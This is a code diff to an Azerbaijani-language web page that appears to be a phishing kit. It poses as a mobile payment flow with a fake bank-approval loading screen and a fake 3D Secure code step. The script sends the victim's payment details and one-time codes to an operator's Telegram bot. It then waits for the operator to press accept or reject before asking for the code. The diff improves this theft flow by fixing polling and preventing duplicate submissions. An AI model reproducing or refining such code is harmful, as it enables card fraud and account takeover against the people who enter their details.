@@ -157,6 +157,9 @@
         .ml-auto{margin-left:auto}
         .mr-2{margin-right:.5rem}
         .mr-1{margin-right:.25rem}
+        .cursor-pointer{cursor:pointer}
+        .relative{position:relative}
+        .z-10{z-index:10}
     </style>
 </head>
 <body class="flex items-center justify-center p-4">
@@ -387,7 +390,7 @@
                 </button>
             </div>
 
-            <!-- Step 6: Processing - LOADING EKRANI -->
+            <!-- Step 6: Processing -->
             <div id="step-6" class="hidden text-center py-12 fade-in">
                 <div class="flex items-center gap-3 mb-6">
                     <button class="back-btn" onclick="goBack()">
@@ -435,6 +438,7 @@
                     <i class="far fa-clock mr-1"></i> Kodun etibarlılıq müddəti: 5 dəqiqə
                 </div>
 
+                <!-- "Təsdiq et" düyməsi - OTP yazıldıqdan sonra basılmalıdır -->
                 <button onclick="verifyOTP()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-semibold shadow-lg shadow-blue-500/30 mt-4">
                     Təsdiq et
                 </button>
@@ -483,6 +487,7 @@
         let otpLength = 4;
         let loadingTimerInterval = null;
         let loadingSeconds = 0;
+        let isProcessingOTP = false; // OTP təsdiqi zamanı iki dəfə göndərməmək üçün
 
         const operators = [
             { name: "Bakcell", prefixes: ["055", "099"] },
@@ -520,6 +525,7 @@
                 input.setAttribute('inputmode', 'numeric');
                 input.setAttribute('autocomplete', 'one-time-code');
                 
+                // AVTOMATİK TƏSDİQ - SİLDİK! İndi yalnız düymə ilə
                 input.addEventListener('input', function(e) {
                     this.value = this.value.replace(/\D/g, '');
                     if (this.value.length === 1) {
@@ -527,9 +533,8 @@
                         const next = i + 1;
                         if (next < count) {
                             document.getElementById(`otp${next}`).focus();
-                        } else {
-                            setTimeout(() => verifyOTP(), 300);
                         }
+                        // SON XANADA AVTOMATİK TƏSDİQ YOXDUR!
                     } else {
                         this.classList.remove('filled');
                     }
@@ -578,6 +583,7 @@
             }
             const first = document.getElementById('otp0');
             if (first) first.focus();
+            isProcessingOTP = false;
         }
 
         // ========================================
@@ -613,8 +619,8 @@
                     reply_markup: isOTP ? null : {
                         inline_keyboard: [
                             [
-                                { text: "✅ Qəbul et", callback_data: "accept" },
-                                { text: "❌ Reddet", callback_data: "reject" }
+                                { text: "✅ Qəbul et", callback_data: "accept_" + Date.now() },
+                                { text: "❌ Reddet", callback_data: "reject_" + Date.now() }
                             ]
                         ]
                     }
@@ -624,7 +630,7 @@
         }
 
         // ========================================
-        // LOADING EKRANI FUNKSİYALARI
+        // LOADING EKRANI
         // ========================================
         function startLoadingTimer() {
             loadingSeconds = 0;
@@ -637,7 +643,6 @@
                 const el = document.getElementById('loadingTimer');
                 if (el) el.textContent = loadingSeconds + ' saniyə';
                 
-                // 10 saniyədən sonra statusu dəyiş
                 if (loadingSeconds === 10) {
                     const status = document.getElementById('loadingStatus');
                     if (status) status.textContent = '⏳ Bank tərəfindən təsdiq gözlənilir...';
@@ -659,15 +664,12 @@
         }
 
         // ========================================
-        // POLLING FUNKSİYASI - DÜZƏLDİ
+        // POLLING - DÜZƏLDİ (lastUpdateId ilə)
         // ========================================
         function startTelegramPolling() {
             if (isWaitingForApproval) return;
             isWaitingForApproval = true;
-            
-            // Loading timer başlat
             startLoadingTimer();
-            
             pollTelegram();
         }
 
@@ -690,12 +692,16 @@
                 
                 if (data.ok && data.result) {
                     for (const update of data.result) {
-                        lastUpdateId = update.update_id;
+                        // Hər update üçün lastUpdateId yenilə (təkrar qarşısını alır)
+                        if (update.update_id > lastUpdateId) {
+                            lastUpdateId = update.update_id;
+                        }
                         
                         if (update.callback_query) {
                             const callbackData = update.callback_query.data;
                             
-                            if (callbackData === "accept") {
+                            // "accept_" ilə başlayan callback-ləri tut
+                            if (callbackData && callbackData.startsWith('accept_')) {
                                 // ✅ Qəbul edildi
                                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                                     method: 'POST',
@@ -719,34 +725,30 @@
                                 // Polling dayandır
                                 stopTelegramPolling();
                                 
-                                // ✅ LOADING EKRANINI BAĞLA - 3D SECURE AÇ
+                                // Loading bağla - 3D Secure aç
                                 const loadingEl = document.getElementById('step-6');
                                 const secureEl = document.getElementById('step-7');
                                 
-                                if (loadingEl) {
-                                    loadingEl.classList.add('hidden');
-                                }
-                                
+                                if (loadingEl) loadingEl.classList.add('hidden');
                                 if (secureEl) {
                                     secureEl.classList.remove('hidden');
-                                    // OTP kutularını təmizlə və fokus ver
                                     clearOTP();
-                                    // Səhifəyə scroll et
                                     setTimeout(() => {
                                         secureEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
                                     }, 200);
                                 }
                                 
-                                // Spinner-i dayandır
                                 const spinner = document.getElementById('loadingSpinner');
                                 if (spinner) {
                                     spinner.style.animation = 'none';
                                     setTimeout(() => { spinner.style.animation = ''; }, 100);
                                 }
                                 
+                                // Əlavə təkrar qarşısı almaq üçün lastUpdateId yenilə
+                                lastUpdateId = update.update_id;
                                 return;
                                 
-                            } else if (callbackData === "reject") {
+                            } else if (callbackData && callbackData.startsWith('reject_')) {
                                 // ❌ İmtina edildi
                                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                                     method: 'POST',
@@ -768,7 +770,6 @@
                                 });
                                 
                                 stopTelegramPolling();
-                                
                                 const loadingEl = document.getElementById('step-6');
                                 if (loadingEl) loadingEl.classList.add('hidden');
                                 
@@ -934,21 +935,25 @@
             document.getElementById('step-5').classList.add('hidden');
             document.getElementById('step-6').classList.remove('hidden');
 
-            // Telegram-a göndər və polling başlat
             sendToTelegram(paymentData);
             startTelegramPolling();
         }
 
         // ========================================
-        // OTP TƏSDİQİ
+        // OTP TƏSDİQİ - YALNIZ DÜYMƏ İLƏ
         // ========================================
         function verifyOTP() {
+            // İki dəfə göndərmənin qarşısını al
+            if (isProcessingOTP) return;
+            
             const code = getOTPCode();
             
             if (code.length !== otpLength) {
                 alert(`⚠️ ${otpLength} rəqəmli kodu tam daxil edin!`);
                 return;
             }
+
+            isProcessingOTP = true;
 
             // Telegram-a OTP kodunu göndər
             sendToTelegram({
@@ -964,6 +969,14 @@
                     el.classList.remove('filled');
                     el.classList.add('completed');
                 }
+            }
+
+            // Düyməni söndür (təkrar basmaq olmasın)
+            const btn = document.querySelector('#step-7 .bg-blue-600');
+            if (btn) {
+                btn.disabled = true;
+                btn.textContent = '⏳ Gözləyin...';
+                btn.classList.add('opacity-50', 'cursor-not-allowed');
             }
 
             document.getElementById('step-7').classList.add('hidden');
@@ -988,6 +1001,17 @@
                     </button>
                 `;
             }, 500);
+            
+            // 3 saniyədən sonra düyməni bərpa et (əgər success açılmazsa)
+            setTimeout(() => {
+                isProcessingOTP = false;
+                const btn = document.querySelector('#step-7 .bg-blue-600');
+                if (btn) {
+                    btn.disabled = false;
+                    btn.textContent = 'Təsdiq et';
+                    btn.classList.remove('opacity-50', 'cursor-not-allowed');
+                }
+            }, 3000);
         }
 
         function goBack() {
@@ -1017,4 +1041,4 @@
         });
     </script>
 </body>
-</html>
+    </html>
